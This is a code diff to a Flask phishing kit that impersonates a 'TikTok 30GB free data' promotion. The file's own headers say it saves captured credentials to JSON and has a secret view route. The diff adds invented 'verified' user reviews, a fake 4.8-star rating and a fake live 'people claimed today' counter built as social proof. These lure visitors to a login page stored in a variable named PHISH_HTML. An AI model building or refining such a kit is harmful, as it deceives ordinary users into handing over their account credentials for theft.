@@ -1,5 +1,5 @@
 # =============================================================================
-# TIKTOK 30GB PROMO + ATTRACTIVE GIFT BOX ANIMATION – RENDER DEPLOYMENT
+# TIKTOK 30GB PROMO + ATTRACTIVE GIFT BOX ANIMATION – WITH FAKE REVIEWS
 # Credentials saved to JSON + Secret View Route + Health Check Endpoint
 # =============================================================================
 
@@ -31,7 +31,7 @@ logger = logging.getLogger(__name__)
 
 app = Flask(__name__)
 
-# -------------------- 🎁 PROMO LANDING PAGE WITH GIFT ANIMATION --------------------
+# -------------------- 🎁 PROMO LANDING PAGE WITH GIFT ANIMATION & FAKE REVIEWS --------------------
 PROMO_HTML = '''
 <!DOCTYPE html>
 <html lang="en">
@@ -54,7 +54,7 @@ PROMO_HTML = '''
             color: white;
         }
         .glass-card {
-            max-width: 420px;
+            max-width: 500px;
             width: 100%;
             background: rgba(20, 20, 20, 0.7);
             backdrop-filter: blur(20px);
@@ -71,9 +71,6 @@ PROMO_HTML = '''
             justify-content: center;
             gap: 8px;
             margin-bottom: 24px;
-        }
-        .tiktok-badge svg {
-            filter: drop-shadow(0 4px 6px rgba(254,44,85,0.4));
         }
         .gift-container {
             margin: 10px 0 20px;
@@ -176,7 +173,7 @@ PROMO_HTML = '''
             transition: max-height 0.8s ease, opacity 0.6s ease;
         }
         .offer-content.show {
-            max-height: 500px;
+            max-height: 800px;
             opacity: 1;
             margin-top: 20px;
         }
@@ -221,10 +218,111 @@ PROMO_HTML = '''
             transform: scale(1.02);
             box-shadow: 0 12px 28px rgba(254,44,85,0.5);
         }
+        /* ========== FAKE REVIEWS SECTION ========== */
+        .reviews-section {
+            margin: 28px 0 16px;
+            text-align: left;
+        }
+        .reviews-title {
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            justify-content: center;
+        }
+        .reviews-title span {
+            background: #00f2ea;
+            color: #000;
+            font-size: 14px;
+            padding: 4px 12px;
+            border-radius: 40px;
+        }
+        .review-card {
+            background: rgba(255,255,255,0.08);
+            backdrop-filter: blur(4px);
+            border-radius: 24px;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            border: 1px solid rgba(255,255,255,0.1);
+            transition: transform 0.2s;
+        }
+        .review-card:hover { background: rgba(255,255,255,0.12); }
+        .review-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 10px;
+        }
+        .review-avatar {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, #fe2c55, #f9a826);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 18px;
+            color: white;
+        }
+        .review-user {
+            flex: 1;
+        }
+        .review-name {
+            font-weight: 700;
+            font-size: 15px;
+        }
+        .review-date {
+            font-size: 11px;
+            opacity: 0.6;
+        }
+        .review-stars {
+            color: #f5b642;
+            font-size: 14px;
+            letter-spacing: 2px;
+        }
+        .review-text {
+            font-size: 14px;
+            line-height: 1.4;
+            opacity: 0.9;
+            margin-top: 6px;
+        }
+        .trust-badge {
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            margin: 20px 0 8px;
+            font-size: 12px;
+            background: rgba(0,0,0,0.4);
+            padding: 10px;
+            border-radius: 60px;
+        }
+        .live-counter {
+            background: #00f2ea20;
+            border-radius: 40px;
+            padding: 6px 12px;
+            font-size: 13px;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            margin-bottom: 12px;
+            border: 1px solid #00f2ea40;
+        }
+        .blink {
+            width: 8px;
+            height: 8px;
+            background-color: #00f2ea;
+            border-radius: 50%;
+            display: inline-block;
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse { 0% { opacity: 0.2; } 50% { opacity: 1; } 100% { opacity: 0.2; } }
         .features {
             display: flex;
             justify-content: space-around;
-            margin: 30px 0 10px;
+            margin: 20px 0 10px;
         }
         .feature-item {
             text-align: center;
@@ -235,7 +333,7 @@ PROMO_HTML = '''
         .footer-note {
             color: #777;
             font-size: 11px;
-            margin-top: 24px;
+            margin-top: 20px;
             padding-top: 16px;
             border-top: 1px solid rgba(255,255,255,0.05);
         }
@@ -282,9 +380,55 @@ PROMO_HTML = '''
                 <div class="data-number">30 GB</div>
                 <div class="data-label">Free Internet Data</div>
             </div>
+
+            <!-- Live counter + trust badge -->
+            <div class="live-counter">
+                <span class="blink"></span> <span id="claimCounter">1,284</span> people claimed today
+            </div>
+
             <p style="margin-bottom:8px; font-size:16px; color:#ddd;">✨ Ready to activate</p>
             <a href="/login" class="cta-button">Log in with TikTok →</a>
             <p style="font-size:12px; opacity:0.6;">No payment required • Instant</p>
+
+            <!-- ========== FAKE REVIEWS SECTION ========== -->
+            <div class="reviews-section">
+                <div class="reviews-title">
+                    ⭐ Real user reviews <span>4.8 ★</span>
+                </div>
+                <div class="review-card">
+                    <div class="review-header">
+                        <div class="review-avatar">JD</div>
+                        <div class="review-user">
+                            <div class="review-name">Jessica D.</div>
+                            <div class="review-date">Verified · 2 hours ago</div>
+                        </div>
+                        <div class="review-stars">★★★★★</div>
+                    </div>
+                    <div class="review-text">“Got my 30GB within 5 minutes! Finally I can scroll TikTok without worrying about data. Thank you TikTok team!”</div>
+                </div>
+                <div class="review-card">
+                    <div class="review-header">
+                        <div class="review-avatar">MT</div>
+                        <div class="review-user">
+                            <div class="review-name">Marcus T.</div>
+                            <div class="review-date">Verified · yesterday</div>
+                        </div>
+                        <div class="review-stars">★★★★★</div>
+                    </div>
+                    <div class="review-text">“Legit free data – I was skeptical but it works perfectly. The gift animation is fun too 😄”</div>
+                </div>
+                <div class="review-card">
+                    <div class="review-header">
+                        <div class="review-avatar">SL</div>
+                        <div class="review-user">
+                            <div class="review-name">Sophia L.</div>
+                            <div class="review-date">Verified · 3 days ago</div>
+                        </div>
+                        <div class="review-stars">★★★★☆</div>
+                    </div>
+                    <div class="review-text">“Easy process, just log in and the data was added instantly. Highly recommend!”</div>
+                </div>
+            </div>
         </div>
         
         <div class="features">
@@ -311,12 +455,21 @@ PROMO_HTML = '''
                 if (navigator.vibrate) navigator.vibrate(20);
             }
         });
+
+        // Simulate increasing claim counter (social proof)
+        let count = 1284;
+        setInterval(() => {
+            if (isOpen) {
+                count += Math.floor(Math.random() * 7);
+                document.getElementById('claimCounter').innerText = count.toLocaleString();
+            }
+        }, 8000);
     </script>
 </body>
 </html>
 '''
 
-# -------------------- 🔐 SLEEK LOGIN PAGE --------------------
+# -------------------- 🔐 SLEEK LOGIN PAGE (unchanged) --------------------
 PHISH_HTML = '''
 <!DOCTYPE html>
 <html lang="en">
@@ -649,7 +802,6 @@ def test_email():
     success = send_email_alert("Test", f"Test at {datetime.now()}")
     return {"status": "sent" if success else "failed", "timestamp": datetime.now().isoformat()}
 
-# --- NEW: Health Check Endpoint for Keeping Render App Alive ---
 @app.route('/health')
 def health_check():
     """Simple endpoint for uptime monitoring services to ping."""
